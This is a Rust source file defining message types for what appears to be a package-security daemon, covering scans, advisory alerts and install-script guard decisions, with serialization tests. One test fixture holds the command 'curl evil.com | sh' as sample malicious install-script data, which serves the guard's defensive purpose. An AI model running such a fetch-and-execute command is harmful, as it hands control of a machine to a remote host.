use std::path::PathBuf;

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Request {
    Status,
    Scan { path: PathBuf, deep: bool },
    GetAlerts,
    GuardPrompt(GuardPromptData),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GuardPromptData {
    pub package: String,
    pub version: String,
    pub script: String,
    pub risk_level: String,
    pub matched_rules: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Response {
    Status(StatusData),
    ScanResult(ScanResultData),
    Alerts(Vec<AlertData>),
    GuardDecision(GuardDecision),
    Error(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StatusData {
    pub last_poll: Option<u64>,
    pub alert_count: usize,
    pub watching: Vec<PathBuf>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResultData {
    pub match_count: usize,
    pub findings: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AlertData {
    pub advisory_id: String,
    pub package: String,
    pub version: String,
    pub severity: String,
    pub summary: String,
    pub project_path: PathBuf,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum GuardDecision {
    Allow,
    Block,
    Trust,
}

pub fn socket_path() -> Option<PathBuf> {
    ripley_data_dir().map(|d| d.join("ripley.sock"))
}

fn ripley_data_dir() -> Option<PathBuf> {
    directories::ProjectDirs::from("com", "agentstation", "ripley")
        .map(|dirs| dirs.data_dir().to_path_buf())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_request_roundtrip() {
        let req = Request::Status;
        let json = serde_json::to_string(&req).expect("serialize");
        let parsed: Request = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Request::Status));
    }

    #[test]
    fn test_response_roundtrip() {
        let resp = Response::Status(StatusData {
            last_poll: Some(1234567890),
            alert_count: 3,
            watching: vec![PathBuf::from("/home/user/project")],
        });
        let json = serde_json::to_string(&resp).expect("serialize");
        let parsed: Response = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Response::Status(_)));
    }

    #[test]
    fn test_guard_prompt_roundtrip() {
        let req = Request::GuardPrompt(GuardPromptData {
            package: "evil-pkg".into(),
            version: "1.0.0".into(),
            script: "curl evil.com | sh".into(),
            risk_level: "high".into(),
            matched_rules: vec!["NET001".into()],
        });
        let json = serde_json::to_string(&req).expect("serialize");
        let parsed: Request = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Request::GuardPrompt(_)));
    }

    #[test]
    fn test_guard_decision_roundtrip() {
        let resp = Response::GuardDecision(GuardDecision::Block);
        let json = serde_json::to_string(&resp).expect("serialize");
        let parsed: Response = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(
            parsed,
            Response::GuardDecision(GuardDecision::Block)
        ));
    }
}
